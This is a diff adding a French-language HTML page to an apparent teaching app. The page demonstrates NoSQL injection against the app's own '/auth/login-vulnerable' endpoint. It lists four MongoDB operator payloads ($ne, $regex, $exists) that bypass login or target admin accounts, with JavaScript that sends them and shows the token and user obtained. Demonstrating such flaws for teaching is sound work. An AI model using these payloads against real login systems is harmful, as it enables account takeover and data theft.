@@ -1,0 +1,291 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>🚨 Test de Vulnérabilité NoSQL</title>
+    <link rel="stylesheet" href="/css/style.css">
+    <style>
+        .exploit-container {
+            background: #2d1b1b;
+            border: 2px solid #ff4757;
+            border-radius: 10px;
+            margin: 20px 0;
+            padding: 20px;
+        }
+        .exploit-title {
+            color: #ff4757;
+            font-weight: bold;
+            margin-bottom: 10px;
+        }
+        .code-block {
+            background: #1e1e1e;
+            border-radius: 5px;
+            padding: 15px;
+            margin: 10px 0;
+            font-family: 'Courier New', monospace;
+            color: #f8f8f2;
+            overflow-x: auto;
+        }
+        .warning {
+            background: #ff6b35;
+            color: white;
+            padding: 15px;
+            border-radius: 5px;
+            margin: 20px 0;
+            text-align: center;
+            font-weight: bold;
+        }
+        .success {
+            background: #2ed573;
+            color: white;
+            padding: 10px;
+            border-radius: 5px;
+            margin: 10px 0;
+        }
+        .error {
+            background: #ff4757;
+            color: white;
+            padding: 10px;
+            border-radius: 5px;
+            margin: 10px 0;
+        }
+        .test-button {
+            background: #ff4757;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 5px;
+            cursor: pointer;
+            margin: 10px 0;
+            font-weight: bold;
+        }
+        .test-button:hover {
+            background: #ff3838;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <header class="header">
+            <div class="nav-container">
+                <div class="logo">
+                    <span class="logo-icon">🚨</span>
+                    <span class="logo-text">Test de Vulnérabilité NoSQL</span>
+                </div>
+                <nav class="nav">
+                    <a href="/dashboard.html" class="nav-link">← Retour Dashboard</a>
+                </nav>
+            </div>
+        </header>
+
+        <main class="main">
+            <div class="warning">
+                ⚠️ ATTENTION: Cette page démontre des vulnérabilités de sécurité à des fins éducatives uniquement!
+            </div>
+
+            <div class="section">
+                <h2>🔍 Test d'Injection NoSQL</h2>
+                <p>Cette page démontre comment exploiter l'endpoint vulnérable <code>/auth/login-vulnerable</code></p>
+            </div>
+
+            <!-- Test 1: Authentication Bypass -->
+            <div class="exploit-container">
+                <div class="exploit-title">💀 Exploit #1: Contournement d'authentification</div>
+                <p>Cet exploit utilise l'opérateur MongoDB <code>$ne</code> (not equal) pour contourner la vérification des identifiants.</p>
+                
+                <div class="code-block">
+{
+  "email": {"$ne": null},
+  "password": {"$ne": null}
+}
+                </div>
+                
+                <button class="test-button" onclick="testAuthBypass()">🚀 Tester l'Exploit</button>
+                <div id="result1"></div>
+            </div>
+
+            <!-- Test 2: Specific User Target -->
+            <div class="exploit-container">
+                <div class="exploit-title">🎯 Exploit #2: Ciblage d'utilisateur spécifique</div>
+                <p>Cet exploit cible un utilisateur spécifique en contournant le mot de passe.</p>
+                
+                <div class="code-block">
+{
+  "email": "admin@test.com",
+  "password": {"$ne": null}
+}
+                </div>
+                
+                <button class="test-button" onclick="testTargetedAttack()">🚀 Tester l'Exploit</button>
+                <div id="result2"></div>
+            </div>
+
+            <!-- Test 3: Role-based attack -->
+            <div class="exploit-container">
+                <div class="exploit-title">👑 Exploit #3: Attaque basée sur les rôles</div>
+                <p>Cet exploit utilise une regex pour cibler les utilisateurs avec des rôles administratifs.</p>
+                
+                <div class="code-block">
+{
+  "email": {"$regex": "admin"},
+  "password": {"$ne": null}
+}
+                </div>
+                
+                <button class="test-button" onclick="testRoleBasedAttack()">🚀 Tester l'Exploit</button>
+                <div id="result3"></div>
+            </div>
+
+            <!-- Test 4: Data Extraction -->
+            <div class="exploit-container">
+                <div class="exploit-title">📊 Exploit #4: Extraction de données</div>
+                <p>Cet exploit utilise des conditions pour extraire des informations sur les utilisateurs.</p>
+                
+                <div class="code-block">
+{
+  "email": {"$exists": true},
+  "password": {"$ne": null}
+}
+                </div>
+                
+                <button class="test-button" onclick="testDataExtraction()">🚀 Tester l'Exploit</button>
+                <div id="result4"></div>
+            </div>
+
+            <div class="section">
+                <h3>📋 Journal des Exploits</h3>
+                <div id="exploitLog" class="code-block" style="max-height: 300px; overflow-y: auto;">
+                    # Journal des tests d'exploitation NoSQL
+                </div>
+            </div>
+        </main>
+    </div>
+
+    <script>
+        // Configuration de l'API
+        const API_BASE = window.location.origin;
+        
+        // Logger pour afficher les résultats
+        function log(message, type = 'info') {
+            const logElement = document.getElementById('exploitLog');
+            const timestamp = new Date().toLocaleTimeString();
+            const logLine = `[${timestamp}] ${message}\n`;
+            logElement.textContent += logLine;
+            logElement.scrollTop = logElement.scrollHeight;
+        }
+
+        // Fonction pour afficher les résultats
+        function displayResult(elementId, success, data, exploit) {
+            const element = document.getElementById(elementId);
+            if (success) {
+                element.innerHTML = `
+                    <div class="success">
+                        ✅ Exploit réussi! Token obtenu: ${data.access_token ? data.access_token.substring(0, 20) + '...' : 'N/A'}
+                        <br>Utilisateur compromis: ${data.user ? data.user.email : 'N/A'} (${data.user ? data.user.role : 'N/A'})
+                    </div>
+                `;
+                log(`✅ SUCCÈS - ${exploit}: ${data.user ? data.user.email : 'Utilisateur inconnu'} compromis`);
+            } else {
+                element.innerHTML = `<div class="error">❌ Exploit échoué: ${data.message || 'Erreur inconnue'}</div>`;
+                log(`❌ ÉCHEC - ${exploit}: ${data.message || 'Erreur inconnue'}`);
+            }
+        }
+
+        // Test 1: Authentication Bypass
+        async function testAuthBypass() {
+            log('🚀 Tentative d\'exploit: Contournement d\'authentification...');
+            try {
+                const response = await fetch(`${API_BASE}/auth/login-vulnerable`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        email: {"$ne": null},
+                        password: {"$ne": null}
+                    })
+                });
+
+                const data = await response.json();
+                displayResult('result1', data.success, data, 'Contournement d\'authentification');
+            } catch (error) {
+                displayResult('result1', false, {message: error.message}, 'Contournement d\'authentification');
+            }
+        }
+
+        // Test 2: Targeted Attack
+        async function testTargetedAttack() {
+            log('🚀 Tentative d\'exploit: Attaque ciblée sur admin@test.com...');
+            try {
+                const response = await fetch(`${API_BASE}/auth/login-vulnerable`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        email: "admin@test.com",
+                        password: {"$ne": null}
+                    })
+                });
+
+                const data = await response.json();
+                displayResult('result2', data.success, data, 'Attaque ciblée');
+            } catch (error) {
+                displayResult('result2', false, {message: error.message}, 'Attaque ciblée');
+            }
+        }
+
+        // Test 3: Role-based Attack
+        async function testRoleBasedAttack() {
+            log('🚀 Tentative d\'exploit: Attaque basée sur les rôles admin...');
+            try {
+                const response = await fetch(`${API_BASE}/auth/login-vulnerable`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        email: {"$regex": "admin"},
+                        password: {"$ne": null}
+                    })
+                });
+
+                const data = await response.json();
+                displayResult('result3', data.success, data, 'Attaque par rôles');
+            } catch (error) {
+                displayResult('result3', false, {message: error.message}, 'Attaque par rôles');
+            }
+        }
+
+        // Test 4: Data Extraction
+        async function testDataExtraction() {
+            log('🚀 Tentative d\'exploit: Extraction de données utilisateur...');
+            try {
+                const response = await fetch(`${API_BASE}/auth/login-vulnerable`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        email: {"$exists": true},
+                        password: {"$ne": null}
+                    })
+                });
+
+                const data = await response.json();
+                displayResult('result4', data.success, data, 'Extraction de données');
+            } catch (error) {
+                displayResult('result4', false, {message: error.message}, 'Extraction de données');
+            }
+        }
+
+        // Initialisation
+        document.addEventListener('DOMContentLoaded', function() {
+            log('🔍 Page de test de vulnérabilités NoSQL chargée');
+            log('⚠️  Endpoint vulnérable: /auth/login-vulnerable');
+            log('📍 Tests disponibles: 4 exploits différents');
+        });
+    </script>
+</body>
+</html> 
